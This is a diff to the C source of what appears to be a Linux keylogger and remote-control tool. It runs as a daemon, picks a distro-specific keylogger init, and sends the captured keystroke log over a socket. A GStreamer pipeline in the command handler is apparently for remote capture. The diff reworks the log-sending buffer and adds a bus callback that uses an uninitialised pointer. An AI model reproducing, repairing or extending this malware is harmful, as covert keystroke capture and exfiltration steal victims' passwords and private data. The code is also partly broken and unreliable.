@@ -83,9 +83,9 @@ int main(int argc, char *argv[])
     daemonize();   
     
    
-    //ubuntu16_keylogger_init();
+    ubuntu16_keylogger_init();
 
-    ubuntu18_keylogger_init();
+    //ubuntu18_keylogger_init();
 
     //mint_keylogger_init();
 
@@ -452,7 +452,7 @@ void *send_logger_log()
     int caractereLu = 0;
     
     FILE *log_file = NULL;
-    char buffer[BUFSIZ] = "";
+    char *buffer = NULL;
     int log_empty = 0;
 
     int i = 0;
@@ -463,16 +463,23 @@ void *send_logger_log()
         error("fopen() log_file", "send_logger_log()");
         pthread_exit(NULL);
     }
-  
+
+    fseek(log_file, 0, SEEK_END);
+    file_size = ftell(log_file);
+    rewind(log_file);
+    
+    buffer = malloc(file_size + 1 * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc buffer", "cb_download_log_file'");
+        pthread_exit(NULL);
+    }
+    
     while((caractereLu = fgetc(log_file)) != EOF)
     {
         buffer[i] = (char)caractereLu;
         i++;
     }
-
-    fseek(log_file, 0, SEEK_END);
-    file_size = ftell(log_file);
-    rewind(log_file);
 
     /** Envoie de la taille du fichier txt **/
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
@@ -524,6 +531,7 @@ void *send_logger_log()
     }
 
     fclose(log_file);
+    free(buffer);
     
     pthread_exit(NULL);  
 }
@@ -1116,6 +1124,7 @@ void *execute_cmd()
     char *buffer = NULL;
 
     GstElement *pipeline;
+    GstBus *bus;
     GstStateChangeReturn ret;
     CustomData data;
 
@@ -1156,6 +1165,8 @@ void *execute_cmd()
     {
         data.is_live = TRUE;
     }
+    
+    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
     
     gst_object_unref(pipeline);
     free(buffer);
